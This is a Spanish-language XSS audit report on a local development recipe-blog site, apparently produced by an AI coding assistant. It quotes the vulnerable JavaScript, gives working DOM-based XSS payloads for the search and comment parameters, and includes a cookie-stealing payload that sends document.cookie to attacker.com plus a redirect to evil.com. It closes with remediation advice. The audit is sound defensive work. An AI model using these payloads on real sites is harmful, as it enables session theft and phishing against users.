# Informe de Análisis de Seguridad – Cross-Site Scripting (XSS)

**Objetivo:** http://web.dev.local:8082  
**Fecha:** 2026-04-20T12:45:51  
**Analista:** GitHub Copilot CLI (claude-sonnet-4.6)  
**Tipo de análisis:** Auditoría de vulnerabilidades XSS

---

## Resumen Ejecutivo

Se identificaron **2 vulnerabilidades de tipo Cross-Site Scripting (XSS)** en la aplicación web objetivo ("Blog de Recetas"). Ambas son de tipo **DOM-Based XSS** ya que el código JavaScript del lado del cliente lee parámetros directamente de la URL y los escribe en el DOM sin ningún tipo de sanitización. Se confirmó la explotabilidad mediante construcción de payloads.

---

## Descripción de la Aplicación

La aplicación es un blog de recetas con:
- Un campo de **búsqueda de recetas** (parámetro GET `search`)
- Una sección de **comentarios** (parámetros GET `name` y `comment`, almacenados en `localStorage`)

El servidor ejecuta **Apache/2.4.65 (Unix)** y devuelve HTML estático; toda la lógica de renderizado es client-side mediante JavaScript.

---

## Vulnerabilidades Encontradas

### 1. DOM-Based XSS – Campo de Búsqueda (Reflected)

**Parámetro vulnerable:** `search`  
**Severidad:** Alta (CVSS 3.1: ~6.1 – Medium/High, reflected)  
**Tipo:** DOM-Based XSS (Reflected)

#### Descripción técnica

El script de la página lee el parámetro `search` directamente de `window.location.search` mediante `URLSearchParams` y lo inserta sin escapado en el DOM a través de `document.write`:

```javascript
const urlParams = new URLSearchParams(window.location.search);
const searchTerm = urlParams.get('search');

if (searchTerm) {
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
    // ...
}
```

No existe ninguna función de sanitización ni encoding aplicada a `searchTerm` antes de su uso en `document.write`.

#### Payload de explotación

```
http://web.dev.local:8082/?search=<img src=x onerror=alert('XSS-Reflected')>
```

El HTML resultante generado en el DOM sería:

```html
<p>Resultados para: <strong><img src=x onerror=alert('XSS-Reflected')></strong></p>
```

Al fallar la carga de la imagen (`src=x`), se ejecuta el handler `onerror`, disparando el código JavaScript inyectado.

#### Variantes adicionales

```
# Robo de cookie/sesión:
http://web.dev.local:8082/?search=<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">

# Redirección a sitio malicioso:
http://web.dev.local:8082/?search=<img src=x onerror="window.location='http://evil.com'">
```

---

### 2. DOM-Based XSS – Sección de Comentarios (Stored via localStorage)

**Parámetros vulnerables:** `name`, `comment`  
**Severidad:** Alta (CVSS 3.1: ~6.1 – los datos persisten en localStorage del navegador)  
**Tipo:** DOM-Based XSS (Stored en localStorage)

#### Descripción técnica

Cuando se envía el formulario de comentarios, los parámetros `name` y `comment` se almacenan en `localStorage` sin sanitización:

```javascript
const name = urlParams.get('name');
const comment = urlParams.get('comment');

if (name && comment) {
    let comments = JSON.parse(localStorage.getItem('comments') || '[]');
    comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
    localStorage.setItem('comments', JSON.stringify(comments));
    window.location.href = window.location.pathname;
}
```

Posteriormente, al cargar la página, los comentarios almacenados se renderizan también sin sanitización mediante `document.write`:

```javascript
function displayComments() {
    const comments = JSON.parse(localStorage.getItem('comments') || '[]');
    comments.forEach(function(c, index) {
        document.write('<div class="comment-author">' + c.name + '</div>');
        document.write('<div>' + c.comment + '</div>');
        // ...
    });
}
displayComments();
```

#### Payload de explotación

URL para inyectar el payload:

```
http://web.dev.local:8082/?name=Atacante&comment=<img src=x onerror=alert('XSS-Stored')>
```

Tras la redirección automática a la URL limpia (`/`), cada recarga de la página ejecutará el payload almacenado en `localStorage`.

**Nota:** Este tipo de XSS afecta únicamente al navegador del usuario que lo ejecuta (no se persiste en el servidor), pero puede ser explotado mediante ingeniería social o si el atacante tiene acceso previo al navegador de la víctima.

---

## Análisis de Impacto

| Vulnerabilidad | Tipo | Persistencia | Impacto potencial |
|---|---|---|---|
| XSS en `search` | Reflected DOM-Based | No (por URL) | Robo de sesión, phishing, redirección |
| XSS en `comment` | Stored DOM-Based (localStorage) | Sí (localStorage) | Ejecución persistente en el mismo navegador |

---

## Causa Raíz

La causa raíz de ambas vulnerabilidades es la **ausencia de sanitización de entrada de usuario** antes de insertarla en el DOM. El uso de `document.write()` con contenido no sanitizado es especialmente peligroso.

---

## Recomendaciones

1. **Sanitizar toda entrada de usuario** antes de insertarla en el DOM. Usar funciones de encoding HTML como:
   ```javascript
   function escapeHtml(str) {
       const div = document.createElement('div');
       div.appendChild(document.createTextNode(str));
       return div.innerHTML;
   }
   ```

2. **Reemplazar `document.write`** por métodos seguros como `textContent` o manipulación del DOM con `createElement`/`appendChild`.

3. **Implementar Content Security Policy (CSP)** en los headers HTTP para mitigar el impacto de XSS residuales:
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'
   ```

4. **Validar y sanitizar datos antes de almacenarlos** en `localStorage`, y también al leerlos.

5. Usar una librería de sanitización como [DOMPurify](https://github.com/cure53/DOMPurify).

---

## Conclusión

La aplicación **http://web.dev.local:8082** presenta vulnerabilidades de tipo XSS explotables en sus dos funcionalidades principales. Ambas permiten la ejecución de código JavaScript arbitrario en el contexto del navegador de la víctima. Se recomienda aplicar las correcciones indicadas antes de exponer la aplicación a usuarios finales.

---

*Informe generado automáticamente por análisis de seguridad – 2026-04-20T12:45:51*
